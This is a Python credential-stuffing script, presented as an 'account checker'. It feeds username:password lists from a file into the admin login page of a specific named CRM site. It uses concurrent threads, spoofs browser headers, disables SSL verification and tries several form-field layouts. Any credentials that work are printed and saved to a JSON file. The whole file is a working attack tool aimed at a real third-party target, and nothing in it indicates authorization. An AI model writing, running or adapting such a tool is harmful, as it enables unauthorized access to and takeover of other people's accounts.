#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Account Checker - Validates accounts on teamspoor.znicrm.com
Checks if credentials are valid by attempting login via HTTP requests
"""

import requests
import time
import sys
from typing import Dict, List, Tuple, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed
import json

class AccountChecker:
    """Check account validity on teamspoor.znicrm.com login endpoint"""
    
    def __init__(self, target_url: str, timeout: int = 10, max_workers: int = 5):
        """
        Initialize Account Checker
        
        Args:
            target_url: Login endpoint URL
            timeout: Request timeout in seconds
            max_workers: Maximum concurrent threads
        """
        self.target_url = target_url
        self.timeout = timeout
        self.max_workers = max_workers
        
        # Session for maintaining cookies
        self.session = requests.Session()
        
        # Headers to mimic browser
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0'
        })
        
        # Track results
        self.valid_accounts = []
        self.invalid_accounts = []
        self.errors = []
    
    def check_single_account(self, username: str, password: str) -> Dict:
        """
        Check if a single account is valid
        
        Args:
            username: Username/email to check
            password: Password to check
        
        Returns:
            Dictionary with check results
        """
        result = {
            'username': username,
            'password': password,
            'valid': False,
            'status_code': None,
            'response_text': '',
            'error': None
        }
        
        try:
            # Prepare login data
            login_data = {
                'username': username,
                'password': password,
                # Add other common form fields if needed
                'type': 'Admin'
            }
            
            # Alternative field names to try
            alternative_data = [
                {'email': username, 'password': password, 'type': 'Admin'},
                {'user': username, 'pass': password, 'type': 'Admin'},
                {'login': username, 'pwd': password, 'type': 'Admin'},
                {'username': username, 'password': password, 'type': 'Admin', 'submit': 'Login'},
            ]
            
            # Try primary login data first
            all_attempts = [login_data] + alternative_data
            
            for attempt_data in all_attempts:
                try:
                    # Send POST request
                    response = self.session.post(
                        self.target_url,
                        data=attempt_data,
                        timeout=self.timeout,
                        allow_redirects=True,
                        verify=False  # Disable SSL verification if needed
                    )
                    
                    result['status_code'] = response.status_code
                    result['response_text'] = response.text[:500]  # First 500 chars
                    
                    # Check if login was successful
                    # Common success indicators:
                    success_indicators = [
                        'dashboard', 'welcome', 'logout', 'profile', 'settings',
                        'admin', 'panel', 'home', 'success', 'redirect',
                        'Location' in response.headers,  # Redirect after login
                        response.status_code == 302,  # Redirect status
                        response.status_code == 200 and 'dashboard' in response.text.lower()
                    ]
                    
                    # Common failure indicators:
                    failure_indicators = [
                        'invalid', 'incorrect', 'wrong', 'error', 'failed',
                        'login failed', 'access denied', 'unauthorized',
                        'username or password', 'try again', 'incorrect credentials'
                    ]
                    
                    # Determine validity
                    response_lower = response.text.lower()
                    
                    # Check for success indicators
                    has_success = any(indicator for indicator in success_indicators 
                                    if (isinstance(indicator, str) and indicator in response_lower) or
                                       (isinstance(indicator, bool) and indicator))
                    
                    # Check for failure indicators
                    has_failure = any(indicator in response_lower for indicator in failure_indicators)
                    
                    # Check redirect location (common after successful login)
                    if 'Location' in response.headers:
                        redirect_url = response.headers['Location']
                        if 'login' not in redirect_url.lower() and 'error' not in redirect_url.lower():
                            has_success = True
                    
                    # Determine validity
                    if has_success and not has_failure:
                        result['valid'] = True
                        result['redirect_url'] = response.headers.get('Location', '')
                        break  # Found valid account, stop trying alternatives
                    elif has_failure:
                        result['valid'] = False
                        break  # Clear failure, stop trying
                    # If unclear, continue to next attempt
                    
                except requests.exceptions.RequestException as e:
                    result['error'] = f"Request error: {str(e)}"
                    continue  # Try next alternative
            
            # If no clear result, default to invalid
            if result['status_code'] is None:
                result['error'] = "No successful request made"
                result['valid'] = False
            
        except Exception as e:
            result['error'] = f"Exception: {str(e)}"
            result['valid'] = False
        
        return result
    
    def check_accounts_batch(self, accounts: List[Tuple[str, str]], 
                            show_progress: bool = True) -> Dict:
        """
        Check multiple accounts concurrently
        
        Args:
            accounts: List of (username, password) tuples
            show_progress: Whether to print progress
        
        Returns:
            Dictionary with all results
        """
        total = len(accounts)
        checked = 0
        valid_count = 0
        
        print(f"[*] Starting batch check for {total} accounts...")
        print(f"[*] Target: {self.target_url}")
        print(f"[*] Max workers: {self.max_workers}\n")
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            # Submit all tasks
            future_to_account = {
                executor.submit(self.check_single_account, username, password): (username, password)
                for username, password in accounts
            }
            
            # Process results as they complete
            for future in as_completed(future_to_account):
                checked += 1
                username, password = future_to_account[future]
                
                try:
                    result = future.result()
                    
                    if result['valid']:
                        valid_count += 1
                        self.valid_accounts.append(result)
                        status = "✅ VALID"
                        print(f"[{checked}/{total}] {status} | {username}:{password}")
                        if 'redirect_url' in result:
                            print(f"      → Redirect: {result['redirect_url']}")
                    else:
                        self.invalid_accounts.append(result)
                        status = "❌ INVALID"
                        if result.get('error'):
                            print(f"[{checked}/{total}] {status} | {username}:{password} | Error: {result['error']}")
                        else:
                            print(f"[{checked}/{total}] {status} | {username}:{password}")
                    
                except Exception as e:
                    error_result = {
                        'username': username,
                        'password': password,
                        'valid': False,
                        'error': f"Exception: {str(e)}"
                    }
                    self.errors.append(error_result)
                    print(f"[{checked}/{total}] ❌ ERROR | {username}:{password} | {str(e)}")
                
                # Progress update
                if show_progress and checked % 10 == 0:
                    print(f"\n[*] Progress: {checked}/{total} ({checked*100//total}%) | Valid: {valid_count}\n")
        
        return {
            'total': total,
            'valid': len(self.valid_accounts),
            'invalid': len(self.invalid_accounts),
            'errors': len(self.errors),
            'valid_accounts': self.valid_accounts,
            'invalid_accounts': self.invalid_accounts[:10],  # First 10 invalid
            'errors': self.errors
        }
    
    def check_from_file(self, file_path: str, delimiter: str = ':') -> Dict:
        """
        Check accounts from a file (username:password format)
        
        Args:
            file_path: Path to account file
            delimiter: Delimiter between username and password
        
        Returns:
            Dictionary with all results
        """
        accounts = []
        
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                for line_num, line in enumerate(f, 1):
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    
                    if delimiter in line:
                        parts = line.split(delimiter, 1)
                        if len(parts) == 2:
                            username = parts[0].strip()
                            password = parts[1].strip()
                            if username and password:
                                accounts.append((username, password))
                        else:
                            print(f"[!] Skipping invalid line {line_num}: {line}")
                    else:
                        print(f"[!] Skipping line {line_num} (no delimiter): {line}")
            
            print(f"[*] Loaded {len(accounts)} accounts from {file_path}\n")
            
            if not accounts:
                return {'error': 'No valid accounts found in file'}
            
            return self.check_accounts_batch(accounts)
            
        except FileNotFoundError:
            return {'error': f'File not found: {file_path}'}
        except Exception as e:
            return {'error': f'Error reading file: {str(e)}'}
    
    def save_results(self, output_file: str = 'check_results.json'):
        """Save results to JSON file"""
        results = {
            'target_url': self.target_url,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'summary': {
                'total_checked': len(self.valid_accounts) + len(self.invalid_accounts) + len(self.errors),
                'valid': len(self.valid_accounts),
                'invalid': len(self.invalid_accounts),
                'errors': len(self.errors)
            },
            'valid_accounts': self.valid_accounts,
            'invalid_accounts': self.invalid_accounts,
            'errors': self.errors
        }
        
        try:
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(results, f, indent=2, ensure_ascii=False)
            print(f"\n[*] Results saved to: {output_file}")
        except Exception as e:
            print(f"[!] Error saving results: {e}")


def main():
    """Main function"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description='Check account validity on teamspoor.znicrm.com',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Check single account
  python account_checker.py -u admin -p password123
  
  # Check from file
  python account_checker.py -f accounts.txt
  
  # Check with custom workers
  python account_checker.py -f accounts.txt -w 10
        """
    )
    
    parser.add_argument('-u', '--username', help='Username/email to check')
    parser.add_argument('-p', '--password', help='Password to check')
    parser.add_argument('-f', '--file', help='File with accounts (username:password format)')
    parser.add_argument('-t', '--target', 
                       default='https://teamspoor.znicrm.com/login.php?type=Admin',
                       help='Target login URL')
    parser.add_argument('-w', '--workers', type=int, default=5,
                       help='Number of concurrent workers (default: 5)')
    parser.add_argument('--timeout', type=int, default=10,
                       help='Request timeout in seconds (default: 10)')
    parser.add_argument('-o', '--output', default='check_results.json',
                       help='Output file for results (default: check_results.json)')
    
    args = parser.parse_args()
    
    # Initialize checker
    checker = AccountChecker(
        target_url=args.target,
        timeout=args.timeout,
        max_workers=args.workers
    )
    
    # Check accounts
    if args.file:
        # Check from file
        results = checker.check_from_file(args.file)
    elif args.username and args.password:
        # Check single account
        print(f"[*] Checking single account: {args.username}")
        result = checker.check_single_account(args.username, args.password)
        
        if result['valid']:
            print(f"\n✅ VALID ACCOUNT FOUND!")
            print(f"   Username: {result['username']}")
            print(f"   Password: {result['password']}")
            if 'redirect_url' in result:
                print(f"   Redirect: {result['redirect_url']}")
        else:
            print(f"\n❌ INVALID ACCOUNT")
            print(f"   Username: {result['username']}")
            print(f"   Password: {result['password']}")
            if result.get('error'):
                print(f"   Error: {result['error']}")
        
        results = {
            'total': 1,
            'valid': 1 if result['valid'] else 0,
            'invalid': 0 if result['valid'] else 1,
            'errors': 0,
            'valid_accounts': [result] if result['valid'] else [],
            'invalid_accounts': [result] if not result['valid'] else [],
            'errors': []
        }
    else:
        parser.print_help()
        return
    
    # Print summary
    print(f"\n{'='*60}")
    print(f"CHECK SUMMARY")
    print(f"{'='*60}")
    print(f"Total checked: {results['total']}")
    print(f"✅ Valid: {results['valid']}")
    print(f"❌ Invalid: {results['invalid']}")
    print(f"⚠️  Errors: {results.get('errors', 0)}")
    print(f"{'='*60}\n")
    
    # Save results
    if results.get('valid_accounts'):
        print(f"✅ VALID ACCOUNTS:")
        for acc in results['valid_accounts']:
            print(f"   {acc['username']}:{acc['password']}")
        print()
    
    checker.save_results(args.output)


if __name__ == '__main__':
    # Suppress SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    main()
